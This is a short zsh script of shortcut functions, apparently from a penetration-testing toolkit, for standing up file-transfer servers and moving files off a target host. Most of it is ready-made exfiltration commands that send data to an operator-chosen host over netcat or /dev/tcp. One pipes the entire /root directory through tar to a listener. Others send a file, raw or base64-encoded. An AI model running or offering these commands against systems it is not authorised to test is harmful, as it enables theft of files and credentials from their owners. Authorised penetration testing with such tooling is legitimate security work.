#!/usr/bin/env zsh

############################################################# 
# srv
#############################################################

qq-srv-web() print -z "sudo python3 -m http.server 80"
qq-srv-ftp() print -z "sudo python3 -m pyftpdlib -p 21 -w"
qq-srv-smb() print -z "sudo impacket-smbserver -smb2supp F ."
qq-srv-tftp() print -z "sudo service atftpd start"
qq-srv-smtp() print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"

qq-srv-nc-tar() {
    local h && read "h?LHOST: "
    local p && read "p?LPORT: "
    local c="tar cfv - /root | nc ${h} ${p}"
    echo ${c} | __clip
    __info ${c}
    __ok-clip  
    print -z "nc -nvlp ${p} | tar xfv -"
}

qq-srv-nc-file() {
    local h && read "h?LHOST: "
    local p && read "p?LPORT: "
    local c="cat FILE > /dev/tcp/${h}/${p}"
    echo ${c} | __clip
    __info ${c}
    __ok-clip  
    print -z "nc -nvlp ${p} -w 5 > incoming.txt"  
}

qq-srv-nc-b64() {
    local h && read "h?LHOST: "
    local p && read "p?LPORT: "
    local c="openssl base64 -in FILE > /dev/tcp/${h}/${p}"
    echo ${c} | __clip
    __info ${c}
    __ok-clip  
    print -z "nc -nvlp ${p} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
}
